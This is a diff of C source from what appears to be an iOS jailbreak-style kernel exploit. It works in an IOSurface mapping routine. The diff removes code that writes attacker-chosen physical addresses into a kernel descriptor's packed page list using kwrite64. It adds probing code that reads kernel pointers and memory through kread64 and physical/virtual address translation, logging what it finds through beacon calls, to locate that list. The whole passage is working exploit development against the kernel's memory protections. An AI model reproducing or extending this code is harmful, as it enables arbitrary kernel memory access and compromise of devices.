@@ -298,35 +298,47 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 		             (unsigned long long)s0, (unsigned long long)s1,
 		             (unsigned long long)s2);
 
-		// Infer the encoder from the real sample: low garbage bits come
-		// from s0 itself; the page-number field is everything above the
-		// observed 16KB page size. Rebuild each target slot as
-		//   (s0 & 0x3FFF) | (PA' >> 14 << 14)  when packing is [47:12]<<14
-		// and FALL BACK to PA-as-is if the sample's PA bits don't match
-		// s0's (unknown format ⇒ beacon loudly, leave PA-encoded — v95
-		// showed that can't fault, it just no-ops).
-		uint64_t p0 = backingPA & ~0x3FFFULL;
-		uint64_t enc;
-		if ((s0 >> 14) == (p0 >> 14)) {
-			enc = 14;   // packed = (PA >> 14) << 14 | (s0 & 0x3FFF)
-		} else if ((s0 >> 12) == (p0 >> 12)) {
-			enc = 12;   // packed = (PA >> 12) << 12 | (s0 & 0xFFF)
-		} else {
-			enc = 0;    // unknown — PA-as-is fallback
+		// v99 (v98 verdict): desc+0x60's array is the ECHOED CREATE INPUT
+		// (s0==s2=dummyPageVA, s1=dummyPageSize — user-VA {addr,size}
+		// pairs), NOT the wire's packed output. The packed page list
+		// (§55's VM_PAGE_PACKED, base 0xffffffdc shift 6) lives elsewhere
+		// — prime suspects: the descriptor's own pointer fields d70/d18/
+		// d90 (real kernel pointers in every v75+ pre,desc capture).
+		// v99 = LOCATOR ONLY: alias-dump the first qwords behind each
+		// candidate pointer. No writes — one unknown per launch.
+		uint64_t d70 = kread64(desc + 0x70);
+		uint64_t d18 = kread64(desc + 0x18);
+		uint64_t d90 = kread64(desc + 0x90);
+		jb_tr_beacon("KMAP cand,d70=%llx,d18=%llx,d90=%llx",
+		             (unsigned long long)d70, (unsigned long long)d18,
+		             (unsigned long long)d90);
+		uint64_t a70 = d70 ? phystokv(kvtophys(d70)) : 0;
+		uint64_t a18 = d18 ? phystokv(kvtophys(d18)) : 0;
+		uint64_t a90 = d90 ? phystokv(kvtophys(d90)) : 0;
+		jb_tr_beacon("KMAP cand,al70=%llx,al18=%llx,al90=%llx",
+		             (unsigned long long)a70, (unsigned long long)a18,
+		             (unsigned long long)a90);
+		if (a70) jb_tr_beacon("KMAP d70,q=%llx,%llx,%llx",
+		             (unsigned long long)kread64(a70),
+		             (unsigned long long)kread64(a70 + 8),
+		             (unsigned long long)kread64(a70 + 16));
+		if (a18) jb_tr_beacon("KMAP d18,q=%llx,%llx,%llx",
+		             (unsigned long long)kread64(a18),
+		             (unsigned long long)kread64(a18 + 8),
+		             (unsigned long long)kread64(a18 + 16));
+		if (a90) jb_tr_beacon("KMAP d90,q=%llx,%llx,%llx",
+		             (unsigned long long)kread64(a90),
+		             (unsigned long long)kread64(a90 + 8),
+		             (unsigned long long)kread64(a90 + 16));
+		// Surface-object ranges element too (§55's original packed source):
+		uint64_t sranges = kread64(surface + 0x360);
+		jb_tr_beacon("KMAP s360=%llx", (unsigned long long)sranges);
+		if (sranges) {
+			uint64_t asr = phystokv(kvtophys(sranges));
+			if (asr) jb_tr_beacon("KMAP s360,q=%llx,%llx",
+			             (unsigned long long)kread64(asr),
+			             (unsigned long long)kread64(asr + 8));
 		}
-		jb_tr_beacon("KMAP enc=%d", (int)enc);
-		for (int ei = 0; ei < 4; ei++) {
-			uint64_t targetPA = (pa & ~0x3FFFULL) + ei * 0x4000ULL;
-			uint64_t packed;
-			if (enc == 14)      packed = (targetPA & ~0x3FFFULL) | (s0 & 0x3FFFULL);
-			else if (enc == 12) packed = (targetPA & ~0xFFFULL) | (s0 & 0xFFFULL);
-			else                packed = targetPA;
-			kwrite64(arrAlias + arrOff + 8 * ei, packed);
-		}
-		jb_tr_beacon("KMAP packed4,pa=%llx,w0=%llx,w1=%llx",
-		             (unsigned long long)pa,
-		             (unsigned long long)kread64(arrAlias + arrOff),
-		             (unsigned long long)kread64(arrAlias + arrOff + 8));
 
 		// Re-wire: drain to 0 (unwire) → increment (re-wire reading the
 		// REWRITTEN packed list).
